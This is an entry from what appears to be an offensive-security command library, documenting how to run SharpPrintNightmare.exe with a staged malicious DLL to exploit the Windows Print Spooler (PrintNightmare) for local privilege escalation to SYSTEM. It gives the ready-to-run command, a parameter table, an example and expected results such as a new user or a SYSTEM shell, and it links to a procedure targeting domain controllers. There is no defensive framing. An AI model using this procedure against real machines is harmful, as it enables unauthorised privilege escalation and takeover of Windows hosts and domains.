---
id: 90cd5f72-b35f-4e6d-a7c6-217b89606af2
type: command
executor: cmd
data: 'SharpPrintNightmare.exe C:\\payload.dll'
output: null
created_at: '2023-04-06T03:56:02.971186+00:00'
updated_at: '2023-10-01T00:00:00.000000+00:00'
platforms:
  - Windows
tags:
  - lpe
  - printnightmare
verified: true
validated: true
---

# SharpPrintNightmare-LPE

## Command

```cmd
SharpPrintNightmare.exe C:\\payload.dll
```

## Description

Executes SharpPrintNightmare to load a staged DLL locally via Print Spooler, achieving local privilege escalation to SYSTEM on the target.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| C:\\payload.dll | Path to the malicious DLL on target | Yes |

## Examples

### Basic Usage

```cmd
SharpPrintNightmare.exe C:\addCube.dll
```

## Expected Output

Console output: 'DLL loaded successfully' or payload execution (e.g., new user created, shell spawned). SYSTEM prompt if shell payload used.

## Related

- [[Related Procedure: Exploit-PrintNightmare-for-SYSTEM-Shell-on-Domain-Controller]]
- [[Related Tool: SharpPrintNightmare]]
